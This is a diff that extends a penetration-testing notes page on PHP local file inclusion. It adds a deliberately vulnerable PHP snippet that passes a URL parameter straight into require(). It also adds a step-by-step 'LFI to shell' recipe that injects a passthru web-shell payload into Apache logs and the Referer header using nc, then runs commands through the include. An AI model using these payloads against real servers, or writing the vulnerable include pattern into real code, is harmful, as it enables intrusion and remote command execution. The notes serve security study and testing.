@@ -24,6 +24,18 @@ And this:
 https://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/
 
 
+The vulnerability stems from unsanitized user-input
+
+Here is an example of php-code vulnerable to LFI. As you can see we just pass in the url-parameter into the require-function without any sanitization. So the user can just add the path to any file.
+```
+# index.php
+    <?php
+      $file = $_GET['page'];
+      require($file);
+     ?>
+```
+
+
 ## Linux
 
 ### Tricks
@@ -112,5 +124,46 @@ https://blog.rootshell.be/2010/11/03/bruteforcing-ssh-known_hosts-files/
 
 
 ## LFI to shell
+
+Under the right circumstances you might be able to get a shell from a LFI
+
+There are some requirements. We need to be able to read the apache2 log files, either the success.log or the error.log
+
+So once you have found a LFI vuln you have to inject php-code into the log file and then execute it.
+
+1. Insert php-code into the log file.
+This can be done with nc or telnet.
+
+```
+nc 192.168.1.102 80
+GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1
+Host: 192.168.1.102
+Connection: close
+```
+
+You can also add it to the error-log by making a request to a page that doesn't exists
+
+```
+nc 192.168.1.102 80
+GET /AAAAAA<?php passthru($_GET['cmd']); ?> HTTP/1.1
+Host: 192.168.1.102
+Connection: close
+```
+
+
+Or in the referer parameter.
+```
+GET / HTTP/1.1
+Referer: <? passthru($_GET[cmd]) ?>
+Host: 192.168.1.159
+Connection: close
+```
+
+2. Execute it
+In the browser:
+```
+http://192.168.1.102/index.php?/var/log/apache2/access.log&cmd=id
+```
+
 
 https://www.youtube.com/watch?v=ttTVNcPnsJY
